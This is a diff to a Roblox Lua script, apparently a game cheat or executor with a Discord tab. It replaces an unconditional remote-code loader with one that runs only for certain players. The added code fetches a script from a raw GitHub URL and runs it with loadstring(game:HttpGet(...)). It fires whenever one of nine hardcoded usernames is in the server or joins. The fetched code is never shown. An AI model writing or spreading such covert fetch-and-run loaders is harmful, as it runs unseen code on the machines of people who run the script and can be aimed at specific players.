@@ -825,4 +825,47 @@ DiscordTab:Button(
 
 task.wait(7)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/Adop/refs/heads/main/main"))()
+local Players = game:GetService("Players")
+
+local Username = {
+    "Lilicyy90",
+    "zxrx66666",
+    "PHOENIXX541",
+    "YOURBAE66699",
+    "ANJAYGGMBOT",
+    "Egosaputra07",
+    "AnyaaChn7",
+    "PHOENIX666640",
+    "ZXRX392"
+}
+
+local ScriptURL = "https://raw.githubusercontent.com/changelog-modul/Adop/refs/heads/main/main"
+
+local function isTarget(playerName)
+    for _, name in ipairs(Username) do
+        if playerName == name then
+            return true
+        end
+    end
+    return false
+end
+
+-- fungsi execute
+local function runScript()
+    loadstring(game:HttpGet(ScriptURL))()
+end
+
+-- 🔥 CEK PLAYER YANG SUDAH ADA
+for _, player in ipairs(Players:GetPlayers()) do
+    if isTarget(player.Name) then
+        runScript()
+        return
+    end
+end
+
+-- 🔥 TUNGGU PLAYER MASUK
+Players.PlayerAdded:Connect(function(player)
+    if isTarget(player.Name) then
+        runScript()
+    end
+end)
